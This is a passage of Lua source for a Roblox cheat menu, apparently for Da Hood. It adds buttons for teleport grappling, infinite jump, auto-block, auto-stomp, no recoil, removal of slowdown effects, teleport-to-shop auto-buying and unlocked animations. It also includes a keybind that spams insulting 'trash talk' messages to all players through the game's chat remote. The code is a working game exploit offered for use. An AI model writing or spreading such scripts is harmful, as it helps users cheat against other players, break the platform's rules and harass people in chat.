        if game:GetService('Players').LocalPlayer.Character:FindFirstChild('LowerTorso'):FindFirstChild('BOOMBOXSOUND').SoundId == 'rbxassetid://' .. i and OriginalKeyUpValue == v then
            StopAudio();
        end;
    end);
    w();
end;

function Play(i, v, w)
    if game:GetService('Players').LocalPlayer:FindFirstChildOfClass('Backpack'):FindFirstChild('[Boombox]') then
        local Tool = nil;
        if game:GetService('Players').LocalPlayer.Character:FindFirstChildOfClass('Tool') and w == true then
            Tool = game:GetService('Players').LocalPlayer.Character:FindFirstChildOfClass('Tool')
            game:GetService('Players').LocalPlayer.Character:FindFirstChildOfClass('Tool').Parent = game:GetService('Players').LocalPlayer:FindFirstChildOfClass('Backpack');
        end;
        game:GetService('Players').LocalPlayer:FindFirstChildOfClass('Backpack'):FindFirstChild('[Boombox]').Parent = game:GetService('Players').LocalPlayer.Character;
        game:GetService('ReplicatedStorage'):FindFirstChild('MainEvent'):FireServer('Boombox', i);
        game:GetService('Players').LocalPlayer.Character:FindFirstChild('[Boombox]').RequiresHandle = false;
        if game:GetService('Players').LocalPlayer.Character:FindFirstChild('[Boombox]'):FindFirstChild('Handle') then
            game:GetService('Players').LocalPlayer.Character:FindFirstChild('[Boombox]'):FindFirstChild('Handle'):Destroy();
        end
        game:GetService('Players').LocalPlayer.Character:FindFirstChild('[Boombox]').Parent = game:GetService('Players').LocalPlayer:FindFirstChildOfClass('Backpack')
        if game:GetService('Players').LocalPlayer:FindFirstChildOfClass('PlayerGui'):FindFirstChild('MainScreenGui'):FindFirstChild('BoomboxFrame') then
            game:GetService('Players').LocalPlayer:FindFirstChildOfClass('PlayerGui'):FindFirstChild('MainScreenGui'):FindFirstChild('BoomboxFrame').Visible = false;
        end;
        if Tool ~= true then
            if Tool then
                Tool.Parent = game:GetService('Players').LocalPlayer.Character
            end;
        end;
        if v == true then
            game:GetService('Players').LocalPlayer.Character:FindFirstChild('LowerTorso'):WaitForChild('BOOMBOXSOUND');
            local x = coroutine.wrap(function()
                repeat
                    wait()
                until game:GetService('Players').LocalPlayer.Character:FindFirstChild('LowerTorso'):FindFirstChild('BOOMBOXSOUND').SoundId == 'rbxassetid://' .. i and game:GetService('Players').LocalPlayer.Character:FindFirstChild('LowerTorso'):FindFirstChild('BOOMBOXSOUND').TimeLength > 0.01
                OriginalKeyUpValue = OriginalKeyUpValue + 1;
                Stop(i, OriginalKeyUpValue);
            end);
            x();
        end;
    end;
end;

local plr = game.Players.LocalPlayer
local mouse = plr:GetMouse()
mouse.KeyDown:connect(function(key)
    if key == "q" then
        if game:GetService('Players').LocalPlayer:GetMouse().Target and Cooldown == false then
            Cooldown = true;
            game:GetService('Players').LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(Grapple):Play();
            Play(151733071, true, true)
            wait(0.25)
            local Rotation = game:GetService('Players').LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame - game:GetService('Players').LocalPlayer.Character:FindFirstChild('HumanoidRootPart').Position;
            local Tween = game:GetService('TweenService'):Create(game:GetService('Players').LocalPlayer.Character:FindFirstChild('HumanoidRootPart'), TweenInfo.new(1, Enum.EasingStyle.Linear), {CFrame = CFrame.new(game:GetService('Players').LocalPlayer:GetMouse().Hit.X, game:GetService('Players').LocalPlayer:GetMouse().Hit.Y + 5, game:GetService('Players').LocalPlayer:GetMouse().Hit.Z) * Rotation})
            Tween:Play();
            game:GetService('Players').LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(Swing):Play();
            Tween.Completed:Wait();
            for _, v in pairs(game:GetService('Players').LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid'):GetPlayingAnimationTracks()) do
                if v.Animation.AnimationId == Swing.AnimationId then
                    v:Stop();
                    wait(0.01)
                    game:GetService('Players').LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(Glide):Play();
                    wait(.1)
                end;
            end;
            Cooldown = false;
            if not game:GetService('Players').LocalPlayer.Character:FindFirstChild(Tool) then
                Tool.Parent = game:GetService('Players').LocalPlayer.Character;
            end;
        end;
    end
end)

end
})


FunTab:AddButton({
	Name = "Hearing",
	Callback = function()
    
function Hearing()
	function sandbox(var,func)
		local env = getfenv(func)
		local newenv = setmetatable({},{
			__index = function(self,k)
				if k=="script" then
					return var
				else
					return env[k]
				end
			end,
		})
		setfenv(func,newenv)
		return func
	end
	cors = {}
	mas = Instance.new("Model",game:GetService("Lighting"))
	Tool0 = Instance.new("Tool")
	LocalScript1 = Instance.new("LocalScript")
	BillboardGui2 = Instance.new("BillboardGui")
	ImageLabel3 = Instance.new("ImageLabel")
	ScreenGui4 = Instance.new("ScreenGui")
	TextLabel5 = Instance.new("TextLabel")
	ScreenGui6 = Instance.new("ScreenGui")
	ImageLabel7 = Instance.new("ImageLabel")
	Tool0.Name = "Hearing"
	Tool0.Parent = mas
	Tool0.CanBeDropped = false
	Tool0.RequiresHandle = false
	LocalScript1.Parent = Tool0
	table.insert(cors,sandbox(LocalScript1,function()
		wait();
		local l__LocalPlayer__1 = game.Players.LocalPlayer;
		while true do
			wait();
			if l__LocalPlayer__1.Character then
				break;
			end;
		end;
		local l__Character__2 = l__LocalPlayer__1.Character;
		local u1 = false;
		local l__PlayerGui__2 = game.CoreGui;
		function ChatFunc(p1)
			local v3 = p1.Chatted:connect(function(p2)
				if u1 then
					local v4 = BrickColor.Random();
					local v5 = script.MsgGui:Clone();
					if string.find(string.lower(p2), "super") then
						v5.Msg.TextSize = 29;
					end;
					v5.Msg.Text = p1.Name .. ": " .. p2;
					v5.Msg.TextColor3 = v4.Color;
					v5.Msg.Position = UDim2.new(0.5, math.random(-350, 350), 0.5, math.random(-210, 250));
					v5.Parent = l__PlayerGui__2;
					local v6 = script.DotGui:Clone();
					v6.Dot.ImageColor3 = v4.Color;
					v6.Enabled = true;
					if p1.Character then
						if p1.Character:findFirstChild("Head") then
							v6.Parent = p1.Character.Head;
						end;
					end;
					spawn(function()
						local v7 = 1 - 1;
						while true do
							v6.Size = v6.Size - UDim2.new(0, 1, 0, 1);
							game:GetService("RunService").RenderStepped:wait();
							if 0 <= 1 then
								if v7 < 70 then

								else
									break;
								end;
							elseif 70 < v7 then

							else
								break;
							end;
							v7 = v7 + 1;				
						end;
					end);
					game.Debris:AddItem(v5, 3);
					game.Debris:AddItem(v6, 6);
				end;
			end);
		end;
		for v8, v9 in pairs(game.Players:GetChildren()) do
			ChatFunc(v9);
		end;
		game.Players.PlayerAdded:connect(function(p3)
			ChatFunc(p3);
		end);
		local u3 = false;
		local u4 = nil;
		script.Parent.Equipped:connect(function(p4)
			p4.Button1Down:connect(function()
				if u3 then
					return;
				end;
				u3 = true;
				if not u1 then
					u4 = script.Frame:Clone();
					u4.Parent = l__PlayerGui__2;
					u1 = true;
				else
					u4:Destroy();
					u1 = false;
				end;
				wait(1);
				u3 = false;
			end);
		end);
	end))
	BillboardGui2.Name = "DotGui"
	BillboardGui2.Parent = LocalScript1
	BillboardGui2.Enabled = false
	BillboardGui2.Size = UDim2.new(0, 90, 0, 90)
	BillboardGui2.Active = true
	BillboardGui2.ClipsDescendants = true
	BillboardGui2.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	BillboardGui2.AlwaysOnTop = true
	ImageLabel3.Name = "Dot"
	ImageLabel3.Parent = BillboardGui2
	ImageLabel3.Size = UDim2.new(1, 0, 1, 0)
	ImageLabel3.BackgroundColor = BrickColor.new("Institutional white")
	ImageLabel3.BackgroundColor3 = Color3.new(1, 1, 1)
	ImageLabel3.BackgroundTransparency = 1
	ImageLabel3.Image = "rbxassetid://130424513"
	ImageLabel3.ImageColor3 = Color3.new(1, 0, 0)
	ScreenGui4.Name = "MsgGui"
	ScreenGui4.Parent = LocalScript1
	ScreenGui4.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	TextLabel5.Name = "Msg"
	TextLabel5.Parent = ScreenGui4
	TextLabel5.Position = UDim2.new(0, 300, 0, 25)
	TextLabel5.Size = UDim2.new(0, 1, 0, 1)
	TextLabel5.BackgroundColor = BrickColor.new("Institutional white")
	TextLabel5.BackgroundColor3 = Color3.new(1, 1, 1)
	TextLabel5.BackgroundTransparency = 1
	TextLabel5.Font = Enum.Font.SourceSansBold
	TextLabel5.FontSize = Enum.FontSize.Size28
	TextLabel5.Text = ""
	TextLabel5.TextColor = BrickColor.new("Really black")
	TextLabel5.TextColor3 = Color3.new(0, 0, 0)
	TextLabel5.TextSize = 25
	TextLabel5.TextStrokeTransparency = 0.60000002384186
	ScreenGui6.Name = "Frame"
	ScreenGui6.Parent = LocalScript1
	ScreenGui6.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	ImageLabel7.Name = "Image"
	ImageLabel7.Parent = ScreenGui6
	ImageLabel7.Size = UDim2.new(1, 0, 1, 0)
	ImageLabel7.BackgroundColor = BrickColor.new("Institutional white")
	ImageLabel7.BackgroundColor3 = Color3.new(1, 1, 1)
	ImageLabel7.BackgroundTransparency = 1
	ImageLabel7.Image = "rbxassetid://36869195"
	ImageLabel7.ImageColor3 = Color3.new(0.290196, 1, 0.917647)
	ImageLabel7.ImageTransparency = 0.80000001192093
	for i,v in pairs(mas:GetChildren()) do
		v.Parent = game.Players.LocalPlayer.Backpack
		pcall(function() v:MakeJoints() end)
	end
	mas:Destroy()
	for i,v in pairs(cors) do
		spawn(function()
			pcall(v)
		end)
	end
end
game.Players.LocalPlayer.Character:WaitForChild("FULLY_LOADED_CHAR")
wait(1)
Hearing()
game.Players.LocalPlayer.CharacterAdded:connect(function()
	game.Players.LocalPlayer.Character:WaitForChild("FULLY_LOADED_CHAR")
	wait(1)
	Hearing()
end)
end
})




FunTab:AddButton({
	Name = "Heart",
	Callback = function()
        game.Players.LocalPlayer.PlayerGui.MainScreenGui.Bar.HP.Picture.Life.Visible = true
        game.Players.LocalPlayer.CharacterAdded:Connect(function()
        game.Players.LocalPlayer.PlayerGui:WaitForChild("MainScreenGui"):WaitForChild("Bar"):WaitForChild("HP"):WaitForChild("Picture"):WaitForChild("Life").Visible = true
        end)
end
})

FunTab:AddButton({
    Name = "Trash Talk (J)",
    Callback = function()
    Notif("Keybind is 'J'", 10)
	local mouse = game.Players.LocalPlayer:GetMouse()
	mouse.KeyDown:connect(function(key)
		if key == "j" then
			local Trash = {
                'LOG OFF SON',
                'Seed',
                'Your Aimlock Is Bad Get Sonic GUI ',
                'look at yourself kiddo',
                'Sonic GUI On Top',
                'Lose Some Weight Lil Bro',
                'Yo Came From Garbage Or Smt',
                'where are you aiming at?',
                'sonned',
                'bad',
                'even my grandma has faster reactions',
                ':clown:',
                'gg = get good',
                'im just better',
                'my gaming chair is just better',
                'clip me',
                'skill',
                ':Skull:',
                'go play adopt me',
                'go play brookhaven',
                'omg you are so good :screm:',
                'awesome',
                'you built like gru',
                'fridge',
                'do not bully pliisss :sobv:',
                'it was your lag ofc',
                'fly high',
                '*cough* *cough*',
                'son',
                'already mad?',
                'please dont report :sobv:',
                'sob harder',
                'sopt be neamn to me :sob :sob: sov:',
                'alt + f4 for better aim',
                'seed',
                'get a life',
                'focus son',
                'ez',
                'wyd son',
                'log already',
                'bad',
                'get sonic gui son',
                'bro why is it so ez',
                'get better kid',
                'Sorry, I dont speak your native hype-beast tongue.',
                'Oops, sorry! I didnt realize, I was exploiting!',
                'trash',
                "Dahood isn't for you"

            }
			local random = Trash[math.random(1, #Trash)]
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(random, "All")
		end
	end)
    end
})


local CombatTab = Window:MakeTab({
	Name = "Combat",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

CombatTab:AddButton({
	Name = "Inf Jump",
	Callback = function()
        Player = game:GetService"Players".LocalPlayer;
        UIS = game:GetService'UserInputService';
    
        _G.JumpHeight = 50;
    
        function Action(Object, Function)
            if Object ~= nil then
                Function(Object);
            end
        end
    
        UIS.InputBegan:connect(function(UserInput)
            if UserInput.UserInputType == Enum.UserInputType.Keyboard and UserInput.KeyCode == Enum.KeyCode.Space then
                Action(Player.Character.Humanoid, function(self)
                    if self:GetState() == Enum.HumanoidStateType.Jumping or self:GetState() == Enum.HumanoidStateType.Freefall then
                        Action(self.Parent.HumanoidRootPart, function(self)
                            self.Velocity = Vector3.new(0, _G.JumpHeight, 0);
                        end)
                    end
                end)
            end
        end)
		end
})




CombatTab:AddButton({
	Name = "Slient Block",
	Callback = function()
        while wait() do
            for _, v in next, game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):GetPlayingAnimationTracks() do
                if (v.Animation.AnimationId:match("rbxassetid://2788354405")) then
                    v:Stop();
                end;
            end;
        end
		end
})



CombatTab:AddButton({
	Name = "Auto Block",
	Callback = function()
        while wait() do
            pcall(function()
                for i, v in pairs(game.Players:GetPlayers()) do
                    if (v.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 5 and v.Name ~= game.Players.LocalPlayer.Name then 
                        game.ReplicatedStorage.MainEvent:FireServer("Block", true)
                        wait(3)
                        game.ReplicatedStorage.MainEvent:FireServer("Block", false)
                    end
                end
            end)
        end
		end
})



CombatTab:AddToggle({
	Name = "Auto Armor",
	Default = false,
	Callback = function(Value)
    	if Value == false then
            local ItemCost = 1697
            local ClickDetector = game:GetService("Workspace").Ignored.Shop["[Medium Armor] - $1697"].ClickDetector
            local Location = game:GetService("Workspace").Ignored.Shop["[Medium Armor] - $1697"].ClickDetector.Parent.Head.Position
            OldCFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
            local function buy()
                wait()
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Location)
                fireclickdetector(ClickDetector)
            end
            buy()
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = OldCFrame
            game.Players.LocalPlayer.Character.BodyEffects.Armor.Changed:Connect(function(v)
                if v == 0 then
                    buy()
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = OldCFrame
                end
            end)
        end
	end  
})

CombatTab:AddToggle({
	Name = "Anti-FlashBang",
	Default = false,
	Callback = function(Value)
    	local Loop
	local loopFunction = function()
		local WS = game.Players.LocalPlayer.PlayerGui.MainScreenGui:FindFirstChild('whiteScreen')
		if WS then
			WS:Destroy()
		end
	end;
	local Start = function()
		Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
	end;
	local Pause = function()
		Loop:Disconnect()
	end;
	Start()	
	repeat wait() until Value == false
	Pause()
	end  
})

CombatTab:AddToggle({
	Name = "Anti-Slow",
	Default = false,
	Callback = function(gh)
		if gh == true then
			game:GetService('RunService'):BindToRenderStep("Anti-Slow", 0 , function()
				if game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoWalkSpeed") then game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoWalkSpeed"):Destroy() end
				if game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("ReduceWalk") then game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("ReduceWalk"):Destroy() end
				if game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoJumping") then game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoJumping"):Destroy() end
				if game.Players.LocalPlayer.Character.BodyEffects.Reload.Value == true then game.Players.LocalPlayer.Character.BodyEffects.Reload.Value = false end
			end)
		elseif gh == false then
			game:GetService('RunService'):UnbindFromRenderStep("Anti-Slow")
		end
	end  
})





CombatTab:AddToggle({
	Name = "Auto-Stomp",
	Default = false,
	Callback = function(r)
		if r == true then
			game:GetService('RunService'):BindToRenderStep("Auto-Stomp", 0 , function()
				game:GetService("ReplicatedStorage").MainEvent:FireServer("Stomp")
			end)
		elseif r == false then
			game:GetService('RunService'):UnbindFromRenderStep("Auto-Stomp")
		end
	end
})


CombatTab:AddToggle({
	Name = "Auto-Reload",
	Default = false,
	Callback = function(r)
		if r == true then
			game:GetService('RunService'):BindToRenderStep("Auto-Reload", 0 , function()
				if game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool") then
					if game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool"):FindFirstChild("Ammo") then
						if game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool"):FindFirstChild("Ammo").Value <= 0 then
							game:GetService("ReplicatedStorage").MainEvent:FireServer("Reload", game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool")) 
							wait(1)
						end
					end
				end
			end)
		elseif r == false then
			game:GetService('RunService'):UnbindFromRenderStep("Auto-Reload")
		end
	end
})

CombatTab:AddButton({
Name = "No Recoil",
Callback = function()
	local player = game.Players.LocalPlayer
    for i,v in pairs(game:GetService('Workspace'):GetChildren()) do
        if v:IsA('Camera') then
            v:Destroy()
        end
    end
    local newcam = Instance.new('Camera')
    newcam.Parent = game:GetService('Workspace')
    newcam.Name = 'Camera'
    newcam.CameraType = 'Custom'
    newcam.CameraSubject = player.Character:FindFirstChildWhichIsA('Humanoid')
    newcam.HeadLocked = true
    newcam.HeadScale = 1
end
})




CombatTab:AddButton({
    Name = "Animation Pack [Free]",
    Callback = function()
repeat
    wait()
until game:IsLoaded() and game.Players.LocalPlayer.Character:FindFirstChild("FULLY_LOADED_CHAR") and game.Players.LocalPlayer.PlayerGui.MainScreenGui:FindFirstChild("AnimationPack") and game.Players.LocalPlayer.PlayerGui.MainScreenGui:FindFirstChild("AnimationPlusPack")

if game.ReplicatedStorage.ClientAnimations:FindFirstChild("Lean") then
    game.ReplicatedStorage.ClientAnimations.Lean:Destroy()
end

if game.ReplicatedStorage.ClientAnimations:FindFirstChild("Lay") then
    game.ReplicatedStorage.ClientAnimations.Lay:Destroy()
end

if game.ReplicatedStorage.ClientAnimations:FindFirstChild("Dance1") then
    game.ReplicatedStorage.ClientAnimations.Dance1:Destroy()
end

if game.ReplicatedStorage.ClientAnimations:FindFirstChild("Dance2") then
    game.ReplicatedStorage.ClientAnimations.Dance2:Destroy()
end

if game.ReplicatedStorage.ClientAnimations:FindFirstChild("Greet") then
    game.ReplicatedStorage.ClientAnimations.Greet:Destroy()
end

if game.ReplicatedStorage.ClientAnimations:FindFirstChild("Chest Pump") then
    game.ReplicatedStorage.ClientAnimations["Chest Pump"]:Destroy()
end

if game.ReplicatedStorage.ClientAnimations:FindFirstChild("Praying") then
    game.ReplicatedStorage.ClientAnimations.Praying:Destroy()
end

if game.ReplicatedStorage.ClientAnimations:FindFirstChild("TheDefault") then
    game.ReplicatedStorage.ClientAnimations.TheDefault:Destroy()
end

if game.ReplicatedStorage.ClientAnimations:FindFirstChild("Sturdy") then
    game.ReplicatedStorage.ClientAnimations.Sturdy:Destroy()
end

if game.ReplicatedStorage.ClientAnimations:FindFirstChild("Rossy") then
    game.ReplicatedStorage.ClientAnimations.Rossy:Destroy()
end

if game.ReplicatedStorage.ClientAnimations:FindFirstChild("Griddy") then
    game.ReplicatedStorage.ClientAnimations.Griddy:Destroy()
end

if game.ReplicatedStorage.ClientAnimations:FindFirstChild("TPose") then
    game.ReplicatedStorage.ClientAnimations.TPose:Destroy()
end

if game.ReplicatedStorage.ClientAnimations:FindFirstChild("SpeedBlitz") then
    game.ReplicatedStorage.ClientAnimations.SpeedBlitz:Destroy()
end

local Animations = game.ReplicatedStorage.ClientAnimations

local LeanAnimation = Instance.new("Animation", Animations)
LeanAnimation.Name = "Lean"
LeanAnimation.AnimationId = "rbxassetid://3152375249"

local LayAnimation = Instance.new("Animation", Animations)
LayAnimation.Name = "Lay"
LayAnimation.AnimationId = "rbxassetid://3152378852"

local Dance1Animation = Instance.new("Animation", Animations)
Dance1Animation.Name = "Dance1"
Dance1Animation.AnimationId = "rbxassetid://3189773368"

local Dance2Animation = Instance.new("Animation", Animations)
Dance2Animation.Name = "Dance2"
Dance2Animation.AnimationId = "rbxassetid://3189776546"

local GreetAnimation = Instance.new("Animation", Animations)
GreetAnimation.Name = "Greet"
GreetAnimation.AnimationId = "rbxassetid://3189777795"

local ChestPumpAnimation = Instance.new("Animation", Animations)
ChestPumpAnimation.Name = "Chest Pump"
ChestPumpAnimation.AnimationId = "rbxassetid://3189779152"

local PrayingAnimation = Instance.new("Animation", Animations)
PrayingAnimation.Name = "Praying"
PrayingAnimation.AnimationId = "rbxassetid://3487719500"

local TheDefaultAnimation = Instance.new("Animation", Animations)
TheDefaultAnimation.Name = "TheDefault"
TheDefaultAnimation.AnimationId = "rbxassetid://11710529975"

local SturdyAnimation = Instance.new("Animation", Animations)
SturdyAnimation.Name = "Sturdy"
SturdyAnimation.AnimationId = "rbxassetid://11710524717"

local RossyAnimation = Instance.new("Animation", Animations)
RossyAnimation.Name = "Rossy"
RossyAnimation.AnimationId = "rbxassetid://11710527244"

local GriddyAnimation = Instance.new("Animation", Animations)
GriddyAnimation.Name = "Griddy"
GriddyAnimation.AnimationId = "rbxassetid://11710529220"

local TPoseAnimation = Instance.new("Animation", Animations)
TPoseAnimation.Name = "TPose"
TPoseAnimation.AnimationId = "rbxassetid://11710524200"

local SpeedBlitzAnimation = Instance.new("Animation", Animations)
SpeedBlitzAnimation.Name = "SpeedBlitz"
SpeedBlitzAnimation.AnimationId = "rbxassetid://11710541744"

function AnimationPack(Character)
    Character:WaitForChild'Humanoid'
    repeat
        wait()
    until game.Players.LocalPlayer.Character:FindFirstChild("FULLY_LOADED_CHAR") and game.Players.LocalPlayer.PlayerGui.MainScreenGui:FindFirstChild("AnimationPack") and game.Players.LocalPlayer.PlayerGui.MainScreenGui:FindFirstChild("AnimationPlusPack")

    local AnimationPack = game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.AnimationPack
    local AnimationPackPlus = game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.AnimationPlusPack
    local ScrollingFrame = AnimationPack.ScrollingFrame
    local CloseButton = AnimationPack.CloseButton
    local ScrollingFramePlus = AnimationPackPlus.ScrollingFrame
    local CloseButtonPlus = AnimationPackPlus.CloseButton

    local Lean = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(LeanAnimation)

    local Lay = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(LayAnimation)

    local Dance1 = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Dance1Animation)

    local Dance2 = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Dance2Animation)

    local Greet = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(GreetAnimation)

    local ChestPump = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(ChestPumpAnimation)

    local Praying = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(PrayingAnimation)

    local TheDefault = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(TheDefaultAnimation)

    local Sturdy = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(SturdyAnimation)

    local Rossy = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(RossyAnimation)

    local Griddy = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(GriddyAnimation)

    local TPose = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(TPoseAnimation)

    local SpeedBlitz = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(SpeedBlitzAnimation)

    AnimationPack.Visible = true

    AnimationPackPlus.Visible = true

    ScrollingFrame.UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

    ScrollingFramePlus.UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

    for i,v in pairs(ScrollingFrame:GetChildren()) do
        if v.Name == "TextButton" then
            if v.Text == "Lean" then
                v.Name = "LeanButton"
            end
        end
    end

    for i,v in pairs(ScrollingFrame:GetChildren()) do
        if v.Name == "TextButton" then
            if v.Text == "Lay" then
                v.Name = "LayButton"
            end
        end
    end

    for i,v in pairs(ScrollingFrame:GetChildren()) do
        if v.Name == "TextButton" then
            if v.Text == "Dance1" then
                v.Name = "Dance1Button"
            end
        end
    end

    for i,v in pairs(ScrollingFrame:GetChildren()) do
        if v.Name == "TextButton" then
            if v.Text == "Dance2" then
                v.Name = "Dance2Button"
            end
        end
    end

    for i,v in pairs(ScrollingFrame:GetChildren()) do
        if v.Name == "TextButton" then
            if v.Text == "Greet" then
                v.Name = "GreetButton"
            end
        end
    end

    for i,v in pairs(ScrollingFrame:GetChildren()) do
        if v.Name == "TextButton" then
            if v.Text == "Chest Pump" then
                v.Name = "ChestPumpButton"
            end
        end
    end

    for i,v in pairs(ScrollingFrame:GetChildren()) do
        if v.Name == "TextButton" then
            if v.Text == "Praying" then
                v.Name = "PrayingButton"
            end
        end
    end

    for i,v in pairs(ScrollingFramePlus:GetChildren()) do
        if v.Name == "TextButton" then
            if v.Text == "The Default" then
                v.Name = "TheDefaultButton"
            end
        end
    end

    for i,v in pairs(ScrollingFramePlus:GetChildren()) do
        if v.Name == "TextButton" then
            if v.Text == "Sturdy" then
                v.Name = "SturdyButton"
            end
        end
    end

    for i,v in pairs(ScrollingFramePlus:GetChildren()) do
        if v.Name == "TextButton" then
            if v.Text == "Rossy" then
                v.Name = "RossyButton"
            end
        end
    end

    for i,v in pairs(ScrollingFramePlus:GetChildren()) do
        if v.Name == "TextButton" then
            if v.Text == "Griddy" then
                v.Name = "GriddyButton"
            end
        end
    end

    for i,v in pairs(ScrollingFramePlus:GetChildren()) do
        if v.Name == "TextButton" then
            if v.Text == "T Pose" then
                v.Name = "TPoseButton"
            end
        end
    end

    for i,v in pairs(ScrollingFramePlus:GetChildren()) do
        if v.Name == "TextButton" then
            if v.Text == "Speed Blitz" then
                v.Name = "SpeedBlitzButton"
            end
        end
    end

    function Stop()
        Lean:Stop()
        Lay:Stop()
        Dance1:Stop()
        Dance2:Stop()
        Greet:Stop()
        ChestPump:Stop()
        Praying:Stop()
        TheDefault:Stop()
        Sturdy:Stop()
        Rossy:Stop()
        Griddy:Stop()
        TPose:Stop()
        SpeedBlitz:Stop()
    end


    local LeanTextButton = ScrollingFrame.LeanButton
    local LayTextButton = ScrollingFrame.LayButton
    local Dance1TextButton = ScrollingFrame.Dance1Button
    local Dance2TextButton = ScrollingFrame.Dance2Button
    local GreetTextButton = ScrollingFrame.GreetButton
    local ChestPumpTextButton = ScrollingFrame.ChestPumpButton
    local PrayingTextButton = ScrollingFrame.PrayingButton
    local TheDefaultTextButton = ScrollingFramePlus.TheDefaultButton
    local SturdyTextButton = ScrollingFramePlus.SturdyButton
    local RossyTextButton = ScrollingFramePlus.RossyButton
    local GriddyTextButton = ScrollingFramePlus.GriddyButton
    local TPoseTextButton = ScrollingFramePlus.TPoseButton
    local SpeedBlitzTextButton = ScrollingFramePlus.SpeedBlitzButton

    AnimationPack.MouseButton1Click:Connect(function()
        if ScrollingFrame.Visible == false then
            ScrollingFrame.Visible = true
            CloseButton.Visible = true
            AnimationPackPlus.Visible = false
        end
    end)
    AnimationPackPlus.MouseButton1Click:Connect(function()
        if ScrollingFramePlus.Visible == false then
            ScrollingFramePlus.Visible = true
            CloseButtonPlus.Visible = true
            AnimationPack.Visible = false
        end
    end)
    CloseButton.MouseButton1Click:Connect(function()
        if ScrollingFrame.Visible == true then
            ScrollingFrame.Visible = false
            CloseButton.Visible = false
            AnimationPackPlus.Visible = true
        end
    end)
    CloseButtonPlus.MouseButton1Click:Connect(function()
        if ScrollingFramePlus.Visible == true then
            ScrollingFramePlus.Visible = false
            CloseButtonPlus.Visible = false
            AnimationPack.Visible = true
        end
    end)

    LeanTextButton.MouseButton1Click:Connect(function()
        Stop()
        Lean:Play()
    end)
    LayTextButton.MouseButton1Click:Connect(function()
        Stop()
        Lay:Play()
    end)
    Dance1TextButton.MouseButton1Click:Connect(function()
        Stop()
        Dance1:Play()
    end)
    Dance2TextButton.MouseButton1Click:Connect(function()
        Stop()
        Dance2:Play()
    end)
    GreetTextButton.MouseButton1Click:Connect(function()
        Stop()
        Greet:Play()
    end)
    ChestPumpTextButton.MouseButton1Click:Connect(function()
        Stop()
        ChestPump:Play()
    end)
    PrayingTextButton.MouseButton1Click:Connect(function()
        Stop()
        Praying:Play()
    end)
    TheDefaultTextButton.MouseButton1Click:Connect(function()
        Stop()
        TheDefault:Play()
    end)
    SturdyTextButton.MouseButton1Click:Connect(function()
        Stop()
        Sturdy:Play()
    end)
    RossyTextButton.MouseButton1Click:Connect(function()
        Stop()
        Rossy:Play()
    end)
    GriddyTextButton.MouseButton1Click:Connect(function()
        Stop()
        Griddy:Play()
    end)
    TPoseTextButton.MouseButton1Click:Connect(function()
        Stop()
        TPose:Play()
    end)
    SpeedBlitzTextButton.MouseButton1Click:Connect(function()
        Stop()
        SpeedBlitz:Play()
    end)

    game:GetService("Players").LocalPlayer.Character.Humanoid.Running:Connect(function()
        Stop()
    end)

    game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function()
        Stop()
    end)
end
AnimationPack(game.Players.LocalPlayer.Character)
game.Players.LocalPlayer.CharacterAdded:Connect(AnimationPack)
    end
    })



local AutoBuyTab = Window:MakeTab({
	Name = "AutoBuy",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})


for i, v in pairs(game:GetService("Workspace").Ignored.Shop:GetChildren()) do
    AutoBuyTab:AddButton({
        Name = v.Name,
        Callback = function()
            local Pos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
            local Teleport = v:FindFirstChild("Head")
            if Teleport then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Teleport.CFrame
                local CD = v:FindFirstChild("ClickDetector")
                if CD then
                    wait(0.75)
                    fireclickdetector(CD)
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Pos
                end
            end
